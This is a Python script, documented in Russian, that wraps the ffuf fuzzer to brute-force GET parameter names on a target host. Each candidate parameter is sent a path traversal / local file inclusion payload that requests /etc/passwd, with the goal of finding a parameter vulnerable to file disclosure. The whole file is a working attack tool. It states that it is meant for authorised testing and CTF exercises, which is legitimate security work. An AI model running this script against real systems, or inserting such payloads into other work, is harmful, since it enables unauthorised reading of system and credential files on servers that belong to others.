"""
=============================================================================
 1.F_perebor_paramenra.py — обёртка ffuf: поиск уязвимого GET-параметра (LFI/PT)
=============================================================================

ЗАЧЕМ:
    Автоматизирует запуск ffuf для перебора ИМЁН GET-параметров с полезной
    нагрузкой /etc/passwd. Помогает найти параметр, уязвимый к Path Traversal /
    Local File Inclusion (напр. ?FILE=/etc/passwd, ?page=..., ?DIRECTORY=...).
    normalize_target() приводит ввод к http://host:port.

ГДЕ ПРИМЕНИМО:
    Разведка веб-приложения на этапе поиска LFI/PT: неизвестно имя уязвимого
    параметра — перебираем его по словарю directory-list-2.3-medium.

ЗАПУСК:
    python3 1.F_perebor_paramenra.py  → ввести host:port или URL.
    (В самом ffuf placeholder DIRECTORY подставляется в имя параметра.)

ЗАВИСИМОСТИ / ЗАМЕЧАНИЯ:
    - Требуется установленный ffuf и словарь SecLists по пути
      /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt.
    - Флаг -ac (auto-calibration) отсекает мусорные ответы; -t 80 — потоки.
    - Замените payload /etc/passwd под конкретную проверку при необходимости.
    - Только для авторизованного тестирования / CTF.
=============================================================================
"""
import subprocess
import shlex
import re
banner = f"""
 _______         _______  _______  ______  _________        _______  _______  _______ 
(  ____ \       (  ____ \(       )(  __  \ \__   __/       (  ____ )(  ___  )(  ____ )
| (    \/       | (    \/| () () || (  \  )   ) (          | (    )|| (   ) || (    )|
| (__           | |      | || || || |   ) |   | |          | (____)|| (___) || (____)|
|  __)          | |      | |(_)| || |   | |   | |          |  _____)|  ___  ||     __)
| (             | |      | |   | || |   ) |   | |          | (      | (   ) || (\ (   
| )             | (____/\| )   ( || (__/  )___) (___       | )      | )   ( || ) \ \__
|/        _____ (_______/|/     \|(______/ \_______/ _____ |/       |/     \||/   \__/
         (_____)                                    (_____)                           
"""

print(banner)
def normalize_target(target):
    """Нормализация введенного адреса до формата http://host:port"""
    target = target.strip()
    
    # Удаление протокола, если указан
    if target.startswith(('http://', 'https://')):
        target = re.sub(r'^https?://', '', target)
    
    # Добавление порта по умолчанию, если не указан
    if ':' not in target:
        target += ':80'
    
    return f'http://{target}'

def main():
    try:
        # Запрос целевого адреса
        target = input("Введите целевой адрес (например 172.23.141.7:80 или http://example.com): ")
        normalized_target = normalize_target(target)
        
        # Формирование URL для фаззинга
        fuzz_url = f'"{normalized_target}/?DIRECTORY=/etc/passwd"'
        
        # Команда ffuf
        cmd = f'ffuf -u {fuzz_url} ' \
              '-H "Priority: u=0, i" ' \
              '-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" ' \
              '-H "Upgrade-Insecure-Requests: 1" ' \
              '-H "Accept-Language: en-US,en;q=0.5" ' \
              '-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:DIRECTORY ' \
              '-ac -t 80'
        
        print("\nВыполняемая команда:")
        print(cmd)
        print("\nЗапуск ffuf...\n")
        
        # Запуск команды
        subprocess.run(shlex.split(cmd), check=True)
    
    except subprocess.CalledProcessError as e:
        print(f"\nОшибка выполнения ffuf: {e}")
    except KeyboardInterrupt:
        print("\nПрервано пользователем")
    except Exception as e:
        print(f"\nНеожиданная ошибка: {e}")

if __name__ == "__main__":
    main()
